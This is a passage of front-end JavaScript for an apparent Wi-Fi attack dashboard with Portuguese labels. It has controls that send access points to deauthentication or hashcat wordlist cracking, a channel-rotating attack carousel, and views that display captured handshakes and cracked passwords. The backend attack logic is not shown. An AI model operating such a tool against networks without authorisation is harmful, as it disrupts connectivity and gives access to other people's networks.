      <div class="flex items-start gap-2">
        <input type="checkbox" class="mt-1 accent-yellow-400" ${isSelected?"checked":""} onchange="toggleSelecao('${ap.bssid}')" onclick="event.stopPropagation()" aria-label="Selecionar ${ap.essid||ap.bssid}">
        <div class="flex-1 min-w-0">
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-2 min-w-0">
              <span class="font-bold text-white truncate">${(ap.essid||"<oculto>").substring(0,20)}</span>
              ${secBadge}
              ${wps}
              ${memBadges.join(" ")}
            </div>
            <span class="text-xs ${score<40?"text-red-400":score<70?"text-yellow-400":"text-green-400"} font-bold">${score}</span>
          </div>
          <div class="text-xs text-gray-500 mt-1">${ap.bssid} · ch ${ap.canal||"?"} · ${freqResumo(ap)}</div>
          <div class="text-xs text-gray-500">${sinalResumo(ap)} · fonte ${ap.source||"?"}</div>
          ${extra}
          ${ap.achados&&ap.achados.length?`<div class="mt-2 space-y-1">${ap.achados.slice(0,3).map(a=>`<div class="badge-sev-${a.severidade} px-2 py-0.5 rounded text-xs">${a.descricao}</div>`).join("")}</div>`:""}
        </div>
      </div>
    </div>
  `;
}

// B5: debounce de renderização (80ms) — agrupa múltiplos socket events
// e re-renderiza uma só vez. Reduz reflows em ~10x com 50+ APs.
let _renderPending = null;
function renderZonas(){
  if(_renderPending) return;  // já agendado
  _renderPending = setTimeout(()=>{
    _renderPending = null;
    _renderZonasNow();
  }, 80);
}
// Estado do carrossel global (atualizado via socket "carrossel_tick")
let carrosselState = {ativo:false, canal:null, restante_s:0, slot_s:0};

function _agruparPorCanal(bssids, zona){
  // Retorna array de [{canal, aps:[...]}, ...] ordenado por canal asc.
  // Dentro de cada grupo, APs ordenados por RSSI mais forte (menos negativo).
  const grupos = {};
  bssids.forEach(b=>{
    const ap = aps[b];
    if(!ap) return;
    let ch = ap.canal;
    if(ch===undefined||ch===null||ch===""||ch==="?") ch = "?";
    else { try{ ch = parseInt(ch); }catch(e){ ch = "?"; } }
    const key = String(ch);
    if(!grupos[key]) grupos[key] = {canal: ch, aps: []};
    grupos[key].aps.push(ap);
  });
  // Ordena APs dentro do grupo por RSSI desc
  Object.values(grupos).forEach(g=>{
    g.aps.sort((a,b)=>{
      const ra = parseFloat(a.rssi)||-200, rb = parseFloat(b.rssi)||-200;
      return rb - ra;
    });
  });
  // Ordena grupos por canal asc; "?" no final
  return Object.values(grupos).sort((a,b)=>{
    if(a.canal==="?") return 1;
    if(b.canal==="?") return -1;
    return a.canal - b.canal;
  });
}

function _headerCanalHTML(canal, n, zona){
  const corZona = zona==="verde"?"text-green-400":zona==="vermelha"?"text-red-400":"text-cyan-400";
  const slotAtivo = (carrosselState.ativo && carrosselState.canal === canal && (zona==="vermelha"||zona==="azul"));
  const restante = carrosselState.restante_s;
  const slotTotal = carrosselState.slot_s;
  let badge = "";
  if(slotAtivo){
    badge = `<span class="ml-2 text-[0.6rem] px-2 py-0.5 rounded bg-yellow-900/50 border border-yellow-600 text-yellow-300 blink">🔄 atacando · ${restante}s/${slotTotal}s</span>`;
  } else if(carrosselState.ativo && (zona==="vermelha"||zona==="azul") && carrosselState.canais_pendentes && carrosselState.canais_pendentes.includes(canal)){
    badge = `<span class="ml-2 text-[0.6rem] px-2 py-0.5 rounded bg-gray-800 border border-gray-700 text-gray-400">⏳ aguardando</span>`;
  }
  const canalLabel = canal==="?" ? "📡 Canal desconhecido" : `📡 Canal ${canal}`;
  return `<div class="flex items-center justify-between text-xs font-bold uppercase tracking-wider ${corZona} mt-3 mb-1 px-1 border-b border-gray-800/60 pb-0.5">
    <span>${canalLabel} <span class="text-gray-500 font-normal">— ${n} AP${n>1?"s":""}</span></span>
    ${badge}
  </div>`;
}

function _renderZonasNow(){
  ["verde","vermelha","azul"].forEach(z=>{
    const el = document.getElementById("z-"+z);
    const grupos = _agruparPorCanal(zonas[z], z);
    if(grupos.length === 0){
      el.innerHTML = "";
    } else {
      el.innerHTML = grupos.map(g=>{
        return _headerCanalHTML(g.canal, g.aps.length, z) +
               g.aps.map(ap=>cardHTML(ap,z)).join("");
      }).join("");
    }
    document.getElementById("cnt-"+z).textContent = zonas[z].length;
  });
  updateChart();
  atualizarToolbar();
}

function updateChart(){
  const data = [zonas.verde.length, zonas.vermelha.length, zonas.azul.length];
  if(!chartZonas){
    chartZonas = new Chart(document.getElementById("chart-zonas"),{type:"doughnut",data:{labels:["Saudáveis","Deauth","Crack"],datasets:[{data,backgroundColor:["#00ff9f","#ff003c","#00d4ff"],borderColor:"#000",borderWidth:2}]},options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{labels:{color:"#fafafa",font:{size:10}},position:"right"}}}});
  } else { chartZonas.data.datasets[0].data=data; chartZonas.update(); }
}

// ─── Multi-select via checkbox ──────────────────
function toggleSelecao(bssid){
  if(selecionados.has(bssid)) selecionados.delete(bssid);
  else selecionados.add(bssid);
  atualizarToolbar();
  // Re-render só o card afetado seria ideal, mas re-render completo simplifica
  renderZonas();
}
function selecionarTodos(zona){
  zonas[zona].forEach(b=>selecionados.add(b));
  renderZonas();
}
function limparSelecao(){
  selecionados.clear();
  renderZonas();
}
function atualizarToolbar(){
  document.getElementById("stat-sel").textContent = selecionados.size;
  document.getElementById("bulk-toolbar").classList.toggle("hidden", selecionados.size === 0);
}
async function moverSelecionados(destino){
  if(selecionados.size === 0) return;
  const lista = Array.from(selecionados);
  if(destino === "azul"){
    abrirModalParaLote(lista, "verde");
  } else {
    lista.forEach(bssid=>moverInterno(bssid, destino));
    selecionados.clear();
    renderZonas();
  }
}

// ─── Bulk move por zona ─────────────────────────
async function moverTodos(origem, destino){
  const lista = [...zonas[origem]];
  if(lista.length === 0) return;
  if(destino === "azul"){
    abrirModalParaLote(lista, origem);
  } else {
    lista.forEach(bssid=>moverInterno(bssid, destino));
    renderZonas();
  }
}

function pararTudo() {
  const vermelha = [...zonas['vermelha']];
  const azul = [...zonas['azul']];
  if(vermelha.length === 0 && azul.length === 0) {
    log("Nenhum ataque em andamento para parar.", "info");
    return;
  }
  vermelha.forEach(b => moverInterno(b, 'verde'));
  azul.forEach(b => moverInterno(b, 'verde'));
  renderZonas();
  log("🛑 PARADA GERAL: Todos os ataques foram parados e os APs movidos para a zona verde.", "err");
}

// ─── Sortable drag-drop ─────────────────────────
function bindSortable(){
  ["verde","vermelha","azul"].forEach(z=>{
    Sortable.create(document.getElementById("z-"+z),{
      group:"zonas", animation:150, filter:"input[type=checkbox]", preventOnFilter:false,
      onEnd: ev=>{
        const bssid = ev.item.dataset.bssid;
        const destino = ev.to.id.replace("z-","");
        const origem = ev.from.id.replace("z-","");
        if(destino === origem) return;
        if(destino==="azul"){
          ev.from.appendChild(ev.item);   // reverte visual até confirmar
          abrirModalParaLote([bssid], origem);
        } else {
          moverInterno(bssid, destino);
          renderZonas();
        }
      }
    });
  });
}

function moverInterno(bssid, destino, perfil, wordlist, contextual, stopOnCrack){
  const origemAtual = Object.keys(zonas).find(z=>zonas[z].includes(bssid)) || "verde";
  const wordlists = Array.isArray(wordlist) ? wordlist : (wordlist ? [wordlist] : []);
  if(destino==="azul" && wordlists.length === 0){
    abrirModalParaLote([bssid], origemAtual);
    return;
  }
  Object.keys(zonas).forEach(z=>zonas[z]=zonas[z].filter(b=>b!==bssid));
  zonas[destino].push(bssid);
  // Marca para animação visual de transição
  if(destino==="vermelha"){
    zonasRecemDying.add(bssid);
    setTimeout(()=>{zonasRecemDying.delete(bssid); renderZonas();}, 3100);
  } else if(destino==="azul"){
    zonasRecemBlue.add(bssid);
    setTimeout(()=>{zonasRecemBlue.delete(bssid); renderZonas();}, 1600);
  }
  sock.emit("mover_zona",{bssid, destino, perfil, wordlists, contextual, stop_on_crack: stopOnCrack !== false});
  log(`Movido ${bssid} → ${destino}${perfil?` (perfil ${perfil})`:""}${wordlists.length>1?` [${wordlists.length} wordlists]`:""}`,
       destino==="vermelha"?"err":destino==="azul"?"info":"ok");

  if (destino === "vermelha" || destino === "azul") {
    setTimeout(() => {
      const logEl = document.getElementById("logfeed");
      if (logEl) logEl.scrollIntoView({behavior: "smooth", block: "center"});
    }, 150);
  }
}

async function abrirModalParaLote(bssids, origem){
  modalContext = {bssids, origem};
  const primeiro = aps[bssids[0]] || {};
  document.getElementById("modal-bssid").textContent =
    bssids.length === 1 ? bssids[0] : `${bssids.length} APs selecionados`;
  document.getElementById("modal-essid").textContent =
    bssids.length === 1 ? `ESSID: ${primeiro.essid||"<oculto>"}` :
    `ESSIDs: ${bssids.map(b=>aps[b]&&aps[b].essid||"?").slice(0,3).join(", ")}${bssids.length>3?"...":""}`;
  const perfis = await (await fetch("/api/perfis_hashcat")).json();
  const wordlists = await (await fetch("/api/wordlists")).json();
  const sel = document.getElementById("modal-perfil");
  sel.innerHTML = Object.entries(perfis).map(([k,v])=>`<option value="${k}">${v.label}</option>`).join("");

  // Popular lista de wordlists com checkboxes
  const wlList = document.getElementById("modal-wordlist-list");
  if(wordlists.length === 0){
    wlList.innerHTML = "<div class='text-gray-500 italic p-2'>(nenhuma — coloque um .txt em ./WordList/)</div>";
  } else {
    wlList.innerHTML = wordlists.map(w=>{
      const isSelected = selectedWordlists.includes(w);
      const isContextual = w.startsWith("_contextual_");
      return `
        <label class="wordlist-checkbox ${isSelected?'wordlist-selected':''}" id="modal-wl-label-${w}">
          <input type="checkbox" id="modal-wl-check-${w}" ${isSelected?'checked':''}
                 onchange="toggleWordlistSelection('${w}', this.checked); this.parentElement.classList.toggle('wordlist-selected', this.checked);">
          <span class="text-purple-300">📄 ${w}</span>
          <span class="text-gray-500 text-xs ml-auto">${isContextual?"(contextual)":"base"}</span>
        </label>
      `;
    }).join("");
  }
  renderWordlistQueue();
  document.getElementById("modal").classList.remove("hidden");

  setTimeout(() => {
    const wlList = document.getElementById("modal-wordlist-list");
    if (wlList) wlList.scrollIntoView({behavior: "smooth", block: "center"});
  }, 100);
}
function fecharModal(){
  document.getElementById("modal").classList.add("hidden");
  modalContext = null;
}

// (versão completa de abrirDetalhes está mais abaixo, no bloco do modal-detalhes)

function confirmarCrack(){
  if(!modalContext) return;
  if(wordlistQueueOrder.length === 0){
    alert("Selecione pelo menos uma wordlist!");
    return;
  }
  const perfil = document.getElementById("modal-perfil").value;
  const contextual = document.getElementById("modal-contextual").checked;
  const stopOnCrack = document.getElementById("modal-stop-on-crack").checked;
  const wordlists = [...wordlistQueueOrder]; // copia a ordem atual
  modalContext.bssids.forEach(bssid=>moverInterno(bssid, "azul", perfil, wordlists, contextual, stopOnCrack));
  selecionados.clear();
  selectedWordlists = [];
  wordlistQueueOrder = [];
  renderZonas();
  fecharModal();
}

// ─── Cadeado: trava/destrava TODAS as varreduras ────────
let cadeadoTravado = false;

function toggleCadeado(){
  cadeadoTravado = !cadeadoTravado;
  const btn = document.getElementById("btn-cadeado");
  if(cadeadoTravado){
    btn.innerHTML = "🔒 Travado";
    btn.classList.add("bg-yellow-700");
    // Para tudo: scan contínuo + interval do frontend
    if(mapeamentoContinuoAtivo){
      mapeamentoContinuoAtivo = false;
      if(mapeamentoIntervalId){ clearInterval(mapeamentoIntervalId); mapeamentoIntervalId = null; }
      const bm = document.getElementById("btn-mapear");
      if(bm){ bm.innerHTML = "🔄 Mapear Contínuo"; bm.classList.remove("blink","bg-yellow-600"); }
      setLEDStatus("off");
    }
    try{ fetch("/api/rescan_stop", {method:"POST"}); }catch(e){}
    log("🔒 Cadeado travado — varreduras pausadas", "warn");
    toast("🔒 Cadeado travado — clique novamente para liberar");
  } else {
    btn.innerHTML = "🔓 Cadeado";
    btn.classList.remove("bg-yellow-700");
    log("🔓 Cadeado destravado — varreduras liberadas", "ok");
    toast("🔓 Cadeado destravado");
  }
}
function _cadeadoBloqueia(qual){
  if(cadeadoTravado){
    toast(`🔒 ${qual} bloqueado — destrave o cadeado primeiro`);
    log(`🔒 ${qual} bloqueado pelo cadeado`, "warn");
    return true;
  }
  return false;
}

// ─── Mapear redes (rescan + diff) ───────────────
let mapeamentoContinuoAtivo = false;
let mapeamentoIntervalId = null;

async function toggleMapearContinuo(){
  if(_cadeadoBloqueia("Mapear Contínuo")) return;
  const btn = document.getElementById("btn-mapear");

  if(mapeamentoContinuoAtivo){
    // Parar scan contínuo
    mapeamentoContinuoAtivo = false;
    if(mapeamentoIntervalId){
      clearInterval(mapeamentoIntervalId);
      mapeamentoIntervalId = null;
    }
    btn.innerHTML = "🔄 Mapear Contínuo";
    btn.classList.remove("blink");
    btn.classList.remove("bg-yellow-600");
    setLEDStatus("on");  // F6: LED verde (ocioso/online)
    log("⏹ Scan contínuo parado", "warn");
    // Notifica backend
    try{ await fetch("/api/rescan_stop", {method:"POST"}); }catch(e){}
  } else {
    // Iniciar scan contínuo
    mapeamentoContinuoAtivo = true;
    btn.innerHTML = "⏹ Parar Scan";
    btn.classList.add("blink");
    btn.classList.add("bg-yellow-600");
    setLEDStatus("warn");  // F6: LED amarelo (scan ativo)
    log("▶ Scan contínuo iniciado...", "ok");
    // Notifica backend para iniciar
    try{
      await fetch("/api/rescan_start", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({profundo:false})});
    }catch(e){}
    // Executa imediatamente e agenda próximo
    executarScanCiclo();
    mapeamentoIntervalId = setInterval(executarScanCiclo, 5000); // A cada 5 segundos
  }
}

async function executarScanCiclo(){
  if(!mapeamentoContinuoAtivo) return;
  try {
    const r = await fetch("/api/rescan_exec", {method:"POST"});
    const data = await r.json();
    if(data.erro){
      log(`Erro no scan: ${data.erro}`, "err");
    } else if(data.novos > 0) {
      log(`🆕 ${data.novos} redes novas descobertas! Total: ${data.total}`, "ok");
    }
  } catch(e){
    log(`Falha no scan cíclico: ${e.message}`, "err");
  }
}

async function scanNmcli(){
  if(_cadeadoBloqueia("NMCLI")) return;
  const btn = document.getElementById("btn-nmcli");
  const original = "📡 NMCLI";
  if(btn){ btn.innerHTML = "📡 NMCLI..."; btn.disabled = true; }
  try {
    const r = await fetch("/api/scan_nmcli", {method:"POST"});
    const data = await r.json();
    if(data.erro){
      log(`NMCLI erro: ${data.erro}`, "err");
      toast(`NMCLI erro: ${data.erro}`);
    } else {
      log(`📡 NMCLI: +${data.novos} novos | varridos ${data.varridos} | total ${data.total}`, "ok");
      toast(`📡 NMCLI: +${data.novos} novos APs (total ${data.total})`);
    }
  } catch(e){
    log(`NMCLI falhou: ${e.message}`, "err");
  } finally {
    if(btn){ btn.innerHTML = original; btn.disabled = false; }
  }
}

async function scanScapy(){
  if(_cadeadoBloqueia("Scapy")) return;
  const btn = document.getElementById("btn-scapy");
  const original = "🦂 Scapy";
  if(btn){ btn.innerHTML = "🦂 Scapy..."; btn.disabled = true; }
  try {
    const r = await fetch("/api/scan_scapy", {method:"POST"});
    const data = await r.json();
    if(data.erro){
      log(`Scapy erro: ${data.erro}`, "err");
      toast(`Scapy erro: ${data.erro}`);
    } else {
      log(`🦂 Scapy: +${data.novos} novos | varridos ${data.varridos} | total ${data.total}`, "ok");
      toast(`🦂 Scapy: +${data.novos} novos APs (total ${data.total})`);
    }
  } catch(e){
    log(`Scapy falhou: ${e.message}`, "err");
  } finally {
    if(btn){ btn.innerHTML = original; btn.disabled = false; }
  }
}

async function mapearUmaVez(profundo = false){
  const btn = document.getElementById("btn-mapear");
  const original = "🔄 Mapear Contínuo";
  btn.innerHTML = profundo ? "🔍 Scan Profundo..." : "🔄 Mapeando...";
  btn.disabled = true;
  try {
    const r = await fetch("/api/rescan", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({profundo: profundo})
    });
    const data = await r.json();
    if(data.erro){
      log(`Erro no remap: ${data.erro}`, "err");
    } else {
      const modo = profundo ? "[PROFUNDO]" : "";
      log(`${modo} ✓ Remap: ${data.novos} novas | ${data.atualizados||0} atualizadas | total ${data.total}`,"ok");
      if(data.novos > 0 && data.novos_essids){
        toast(`${modo} 🆕 ${data.novos} redes: ${data.novos_essids.slice(0,3).join(", ")}${data.novos_essids.length>3?"...":""}`);
      } else {
        toast(`${modo} Nenhuma rede nova — todas já mapeadas.`);
      }
    }
  } catch(e){
    log(`Falha no remap: ${e.message}`, "err");
  } finally {
    if(!mapeamentoContinuoAtivo){
      btn.innerHTML = original;
      btn.disabled = false;
    }
  }
}

function toast(msg){
  let t = document.getElementById("toast");
  if(!t){
    t = document.createElement("div");
    t.id = "toast";
    t.className = "fixed top-24 right-6 glass border border-purple-700 rounded-lg px-4 py-3 z-50 text-sm fadein";
    t.style.boxShadow = "0 0 20px rgba(188,19,254,0.4)";
    document.body.appendChild(t);
  }
  t.textContent = msg;
  t.style.opacity = "1";
  setTimeout(()=>{t.style.opacity="0"; t.style.transition="opacity .8s"; setTimeout(()=>t.remove(),900);},4000);
}

// F6: LED indicator no header (status do scanner)
function setLEDStatus(estado){
  const el = document.getElementById("led-status");
  if(!el) return;
  el.className = "led led-" + estado;  // on | warn | off
}

// F3: Exportar zona (PDF + TXT) para imports/
async function exportarZona(zona){
  const btn = event && event.currentTarget;
  const original = btn ? btn.innerHTML : null;
  if(btn){ btn.innerHTML = "⏳ exportando..."; btn.disabled = true; }
  try {
    const r = await fetch(`/api/exportar?zona=${encodeURIComponent(zona)}`, {method:"POST"});
    const data = await r.json();
    if(data.erro){
      toast(`❌ Erro ao exportar: ${data.erro}`);
      log(`Falha export ${zona}: ${data.erro}`, "err");
      return;
    }
    if(data.count === 0){
      toast(`⚠ Zona ${zona} está vazia — nada para exportar`);
      return;
    }
    const arquivos = (data.paths||[]).map(p=>p.split(/[\\/]/).pop()).join(", ");
    toast(`✓ ${data.count} APs da zona ${zona} exportados em imports/`);
    log(`📤 Export ${zona}: ${data.count} APs → ${arquivos}`, "ok");
  } catch(e){
    toast(`❌ Falha export: ${e.message}`);
    log(`Falha export ${zona}: ${e.message}`, "err");
  } finally {
    if(btn && original){ btn.innerHTML = original; btn.disabled = false; }
  }
}

// ─── Modal de DETALHES PROFUNDOS ────────────────
async function abrirDetalhes(bssid){
  try {
    const r = await fetch("/api/ap/" + encodeURIComponent(bssid));
    const ap = await r.json();
    document.getElementById("det-essid").textContent = ap.essid || "<oculto>";
    document.getElementById("det-bssid").textContent = ap.bssid + " · ch " + (ap.canal||"?") + " · " + freqResumo(ap) + " · " + sinalResumo(ap);

    const linhas = [];
    // Identidade
    linhas.push(`<div class="cyber rounded p-3 zone-green">
      <h4 class="text-xs font-bold text-green-300 mb-2 uppercase tracking-wider">📡 Identificação</h4>
      <div class="grid grid-cols-2 gap-2 text-xs">
        <div><span class="text-gray-400">ESSID:</span> <span class="text-white font-bold">${ap.essid||"<oculto>"}</span></div>
        <div><span class="text-gray-400">BSSID:</span> <code class="text-cyan-400">${ap.bssid||"?"}</code></div>
        <div><span class="text-gray-400">Canal:</span> <span class="text-white">${ap.canal||"?"}</span></div>
        <div><span class="text-gray-400">Frequência:</span> <span class="text-white">${freqResumo(ap)}</span></div>
        <div><span class="text-gray-400">Sinal:</span> <span class="text-yellow-400">${sinalResumo(ap)}</span></div>
        <div><span class="text-gray-400">Criptografia:</span> <span class="text-orange-400">${ap.security||ap.crypto||"?"}</span></div>
        <div><span class="text-gray-400">Fonte:</span> <span class="text-white">${ap.source||"?"}</span></div>
        <div><span class="text-gray-400">WPS:</span> ${ap.wps_enabled?'<span class="text-red-400 font-bold">ATIVO ⚠</span>':'<span class="text-green-400">desativado</span>'}</div>
      </div>
    </div>`);

    // Score + achados
    const sev = ap.severidade_maior || "ok";
    linhas.push(`<div class="cyber rounded p-3" style="border-left:4px solid ${ap.score<40?'#ff003c':ap.score<70?'#fdee00':'#00ff9f'}">
      <h4 class="text-xs font-bold mb-2 uppercase tracking-wider">🎯 Score de Segurança</h4>
      <div class="flex items-center gap-3">
        <div class="text-4xl font-black ${ap.score<40?'text-red-400':ap.score<70?'text-yellow-400':'text-green-400'}">${ap.score??"?"}</div>
        <div class="text-xs text-gray-400">de 100<br>severidade: <span class="badge-sev-${sev=='ok'?'info':sev} px-2 py-0.5 rounded">${(sev||'ok').toUpperCase()}</span></div>
      </div>
      ${ap.achados&&ap.achados.length?`<div class="mt-3 space-y-1">${ap.achados.map(a=>`<div class="badge-sev-${a.severidade} px-2 py-1 rounded text-xs">${a.descricao}</div>`).join("")}</div>`:`<div class="text-xs text-green-400 mt-2">✓ Nenhuma vulnerabilidade detectada</div>`}
    </div>`);

    // Histórico de visitas
    linhas.push(`<div class="cyber rounded p-3" style="border-left:4px solid var(--purple)">
      <h4 class="text-xs font-bold text-purple-300 mb-2 uppercase tracking-wider">📅 Histórico (memória persistente)</h4>
      <div class="grid grid-cols-2 gap-2 text-xs">
        <div><span class="text-gray-400">Primeiro visto:</span> <span class="text-white">${ap.primeiro_visto?new Date(ap.primeiro_visto).toLocaleString():"agora"}</span></div>
        <div><span class="text-gray-400">Última vez:</span> <span class="text-white">${ap.ultima_vez?new Date(ap.ultima_vez).toLocaleString():"agora"}</span></div>
        <div><span class="text-gray-400">Visitas:</span> <span class="text-purple-400 font-bold">${ap.visitas||1}</span></div>
        <div><span class="text-gray-400">Pacotes deauth:</span> <span class="text-red-400">${(ap.pacotes||0).toLocaleString()}</span></div>
      </div>
      ${ap.historico_zonas&&ap.historico_zonas.length?`<div class="mt-3 text-xs">
        <div class="text-gray-400 mb-1">Linha do tempo:</div>
        <div class="space-y-1 max-h-24 overflow-y-auto">${ap.historico_zonas.slice(-10).map(h=>`<div class="text-gray-500">→ <span class="${h.zona==='vermelha'?'text-red-400':h.zona==='azul'?'text-cyan-400':'text-green-400'} font-bold">${h.zona}</span> em ${new Date(h.em).toLocaleString()}</div>`).join("")}</div>
      </div>`:""}
    </div>`);

    // Handshake
    if(ap.handshake_path){
      linhas.push(`<div class="cyber rounded p-3 zone-blue">
        <h4 class="text-xs font-bold text-cyan-300 mb-2 uppercase tracking-wider">📦 Handshake Capturado</h4>
        <div class="text-xs space-y-1">
          <div><span class="text-gray-400">Arquivo:</span> <code class="text-cyan-400 text-xs break-all">${ap.handshake_path}</code></div>
          <div><span class="text-gray-400">Capturado em:</span> <span class="text-white">${ap.handshake_em?new Date(ap.handshake_em).toLocaleString():"?"}</span></div>
        </div>
      </div>`);
    }

    // Senha quebrada
    if(ap.senha){
      linhas.push(`<div class="cyber rounded p-3" style="border:1px solid #00ff9f; box-shadow:0 0 20px rgba(0,255,159,0.3)">
        <h4 class="text-xs font-bold text-green-300 mb-2 uppercase tracking-wider">🔓 Senha Quebrada</h4>
        <div class="text-2xl font-black text-green-400 font-mono"><code>${ap.senha}</code></div>
        <div class="text-xs text-gray-400 mt-2">
          Quebrada em ${ap.quebrada_em?new Date(ap.quebrada_em).toLocaleString():"?"}<br>
          Wordlist: <code class="text-purple-400">${ap.wordlist_usada||"?"}</code>
        </div>
      </div>`);
    }

    // Crack em andamento
    if(ap.crack && ap.crack.status && ap.crack.status !== "queued"){
      linhas.push(`<div class="cyber rounded p-3 zone-blue">
        <h4 class="text-xs font-bold text-cyan-300 mb-2 uppercase tracking-wider">⚙ Crack em Andamento</h4>
        <div class="text-xs space-y-1">
          <div>Status: <span class="text-cyan-400 font-bold">${statusCrackLabel(ap.crack.status)}</span> · ${(ap.crack.progresso||0).toFixed(1)}%</div>
          <div class="bg-gray-900 h-2 rounded overflow-hidden mt-1"><div class="progress-bar" style="width:${ap.crack.progresso||0}%"></div></div>
          ${ap.crack.wordlist_atual?`<div>Wordlist atual: <span class="text-purple-400">${(ap.crack.wordlist_index||0)+1}/${ap.crack.wordlist_total||1} · ${ap.crack.wordlist_atual}</span></div>`:""}
          ${ap.crack.wordlist_progress?`<div>Progresso da wordlist: <span class="text-purple-400">${ap.crack.wordlist_progress.toFixed(1)}%</span></div>`:""}
          ${ap.crack.eta?`<div>ETA: <span class="text-purple-400">${ap.crack.eta}</span></div>`:""}
          ${ap.crack.erro?`<div class="text-red-400">${ap.crack.erro}</div>`:""}
          ${ap.crack.contextual_count?`<div>Variações contextuais: <span class="text-purple-400">${ap.crack.contextual_count}</span></div>`:""}
        </div>
      </div>`);
    }

    document.getElementById("det-body").innerHTML = linhas.join("");
    document.getElementById("modal-detalhes").classList.remove("hidden");
  } catch(e){
    log(`Erro ao carregar detalhes: ${e.message}`,"err");
  }
}
function fecharDetalhes(){document.getElementById("modal-detalhes").classList.add("hidden");}

// ─── Stats da memória persistente ───────────────
async function atualizarStatsMemoria(){
  try {
    const r = await fetch("/api/memoria/stats");
    const s = await r.json();
    document.getElementById("mem-aps").textContent = s.total_aps || 0;
    document.getElementById("mem-hs").textContent = s.handshakes_em_disco || 0;
    document.getElementById("mem-pwd").textContent = s.quebradas || 0;
  } catch(e){}
}
setInterval(atualizarStatsMemoria, 5000);

// ─── Wordlist preview list ──────────────────────
async function carregarWordlists(){
  const ws = await (await fetch("/api/wordlists")).json();
  const el = document.getElementById("wordlist-list");
  if(!ws || ws.length === 0){
    el.innerHTML = `<div class="text-gray-500 italic">Nenhuma wordlist em ./WordList/. Adicione arquivos .txt.</div>`;
  } else {
    el.innerHTML = ws.map(w=>{
      const isSelected = selectedWordlists.includes(w);
      const isContextual = w.startsWith("_contextual_");
      return `
      <label class="wordlist-checkbox ${isSelected?'wordlist-selected':''}" id="wl-label-${w}">
        <input type="checkbox" id="wl-check-${w}" ${isSelected?'checked':''}
               onchange="toggleWordlistSelection('${w}', this.checked); this.parentElement.classList.toggle('wordlist-selected', this.checked);">
        <span class="text-purple-300">📄 ${w}</span>
        <span class="text-gray-500 text-xs ml-auto">${isContextual?"(contextual)":"base"}</span>
      </label>
    `}).join("");
  }
}

// ─── Funções de Reset ───────────────────────────
function resetDeauth(bssid){
  if(!confirm(`Reiniciar deauth para ${aps[bssid]?.essid || bssid}?`)) return;
  sock.emit("reset_deauth", {bssid});
  log(`↻ Reiniciando deauth para ${bssid}`, "warn");
}
function resetCrack(bssid, recapturar){
  const acao = recapturar ? "recapturar handshake e reiniciar crack" : "reiniciar apenas crack";
  if(!confirm(`${acao} para ${aps[bssid]?.essid || bssid}?`)) return;
  sock.emit("reset_crack", {bssid, recapturar});
  log(`↻ ${acao} para ${bssid}`, "warn");
}
function setSlotVermelha(val){
  if(val === "infinito"){
    sock.emit("set_slot_vermelha", {infinito: true});
    log("🔒 Modo infinito ativado — carrossel trava em 1 canal", "warn");
    toast("🔒 Modo infinito · trava em 1 canal");
  } else {
    const seg = parseInt(val) || 15;
    sock.emit("set_slot_vermelha", {segundos: seg, infinito: false});
    const label = seg >= 3600 ? `${seg/3600}h` : seg >= 60 ? `${seg/60}min` : `${seg}s`;
    log(`⏱ Slot vermelha alterado: ${label}`, "info");
    toast(`⏱ Slot vermelha: ${label}`);
  }
}
function setSlotAzul(val){
  if(val === "infinito"){
    sock.emit("set_slot_azul", {infinito: true});
    log("🔒 Modo infinito (azul) ativado — captura focada em 1 canal", "warn");
    toast("🔒 Slot azul infinito · captura travada em 1 canal");
  } else {
    const seg = parseInt(val) || 10;
    sock.emit("set_slot_azul", {segundos: seg, infinito: false});
    const label = seg >= 60 ? `${seg/60}min` : `${seg}s`;
    log(`⏱ Slot azul alterado: ${label}`, "info");
    toast(`⏱ Slot azul: ${label} · slots maiores = mais chance pra clientes lentos`);
  }
}

function recapturarHandshake(bssid){
  if(!confirm(`Cancelar captura atual e recapturar handshake do zero para ${aps[bssid]?.essid || bssid}?`)) return;
  sock.emit("recapturar_handshake", {bssid});
  log(`🔄 Recaptura solicitada para ${bssid}`, "warn");
  toast(`🔄 Recapturando ${aps[bssid]?.essid || bssid}…`);
}

// ─── Restaurar WiFi (sair do monitor mode) ──────
async function restaurarWifi(){
  if(!confirm("Restaurar WiFi?\n\nIsso vai:\n• Parar o carrossel de ataques\n• Sair do monitor mode\n• Restaurar conexão WiFi normal\n\nAPs em vermelha/azul continuarão na lista mas sem ataque ativo.")) return;
  const btn = document.getElementById("btn-restaurar-wifi");
  const original = btn ? btn.innerHTML : null;
  if(btn){ btn.innerHTML = "⏳ Restaurando..."; btn.disabled = true; }
  try {
    const r = await fetch("/api/restaurar_wifi", {method:"POST"});
    const data = await r.json();
    if(data.erro){
      toast(`❌ Erro: ${data.erro}`);
      log(`Erro ao restaurar WiFi: ${data.erro}`, "err");
    } else {
      toast("📶 WiFi restaurado — modo managed ativo");
      log("📶 WiFi restaurado com sucesso — placa voltou ao modo managed", "ok");
      setLEDStatus("on");
    }
  } catch(e){
    toast(`❌ Falha: ${e.message}`);
    log(`Falha ao restaurar WiFi: ${e.message}`, "err");
  } finally {
    if(btn && original){ btn.innerHTML = original; btn.disabled = false; }
  }
}

// ─── Múltiplas Wordlists ────────────────────────
let selectedWordlists = [];
let wordlistQueueOrder = [];

function toggleWordlistSelection(filename, checked){
  if(checked){
    if(!selectedWordlists.includes(filename)){
      selectedWordlists.push(filename);
      wordlistQueueOrder.push(filename);
    }
  } else {
    selectedWordlists = selectedWordlists.filter(w => w !== filename);
    wordlistQueueOrder = wordlistQueueOrder.filter(w => w !== filename);
  }
  renderWordlistQueue();
}
function removeFromQueue(filename){
  selectedWordlists = selectedWordlists.filter(w => w !== filename);
  wordlistQueueOrder = wordlistQueueOrder.filter(w => w !== filename);
  renderWordlistQueue();
  // Uncheck the checkbox
  const cb = document.getElementById(`wl-check-${filename}`);
  if(cb) cb.checked = false;
  const modalCb = document.getElementById(`modal-wl-check-${filename}`);
  if(modalCb) modalCb.checked = false;
}
function renderWordlistQueue(){
  const el = document.getElementById("wordlist-queue");
  if(!el) return;
  if(wordlistQueueOrder.length === 0){
    el.innerHTML = '<span class="text-gray-500 text-xs italic">Nenhuma wordlist selecionada</span>';
  } else {
    el.innerHTML = wordlistQueueOrder.map((w, i) => `
      <div class="wordlist-queue-item">
        <span>${i+1}. ${w}</span>
        <span class="remove" onclick="removeFromQueue('${w}')">×</span>
      </div>
